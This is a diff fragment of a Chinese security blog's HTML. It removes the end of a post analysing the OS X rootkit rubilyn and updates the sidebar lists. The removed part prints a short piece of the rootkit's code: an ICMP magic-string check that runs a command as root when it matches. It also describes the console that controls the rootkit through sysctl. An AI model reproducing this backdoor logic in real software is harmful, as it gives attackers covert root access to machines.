class="built_in">strncmp</span>(icmp-&gt;icmp_data, icmpstr, MAGIC_ICMP_STR_LEN)==<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        my_KUNCExecute((<span class="keyword">char</span>*)&amp;k_cmd, kOpenAppAsRoot, kOpenApplicationPath);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>rubilyn还有个命令行控制台rubilyncon，通过输入参数选项来执行上面某项功能，主要都是通过sysctl控制内核变量来招待相应函数，这些内核变量都是在rubilyn中用sysctl注册的，通过这些内核变量可从用户层直接与rubilyn内核扩展进行交互来执行恶意操作。</p>
-
-      
-    </div>
-    
-    <footer>
-        <div class="alignright">
-          
-          <a href="/2013/01/01/osx_rootkit_rubilyn_analyze/#comment" class="comment-link">评论</a>
-          
-          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
-        </div>
-        
-  
-  <div class="categories">
-    <a href="/categories/技术分享/">技术分享</a>
-  </div>
-
-        
-  
-  <div class="tags">
-    <a href="/tags/OSX/">OSX</a>, <a href="/tags/rootkit/">rootkit</a>
-  </div>
-
-        <!-- partial('post/share') -->
-      <div class="clearfix"></div>
-    </footer>
-
-  </div>
-</article>
-
-<!-- 
-
- -->
-
-
 
 <nav id="pagination">
   
@@ -762,6 +755,10 @@
 <div class="widget tag">
   <h3 class="title">最新文章</h3>
   <ul class="entry">
+    
+      <li>
+        <a href="/2019/11/18/Fuzzing平台建设的研究与设计/">Fuzzing平台建设的研究与设计</a>
+      </li>
     
       <li>
         <a href="/2019/11/02/Jandroid：半自动化Android应用逻辑漏洞挖掘/">Android应用逻辑漏洞半自动化挖掘思路</a>
@@ -799,10 +796,6 @@
         <a href="/2019/02/22/今年的OffensiveCon大会议题不错/">今年的OffensiveCon大会议题质量不错</a>
       </li>
     
-      <li>
-        <a href="/2019/02/02/winafl中基于插桩的覆盖率反馈原理/">winafl中基于插桩的覆盖率反馈原理</a>
-      </li>
-    
   </ul>
 </div>
 
@@ -812,7 +805,7 @@
   <h3 class="title">分类</h3>
   <ul class="entry">
   
-    <li><a href="/categories/技术分享/">技术分享</a><small>57</small></li>
+    <li><a href="/categories/技术分享/">技术分享</a><small>58</small></li>
   
     <li><a href="/categories/随笔杂谈/">随笔杂谈</a><small>26</small></li>
   
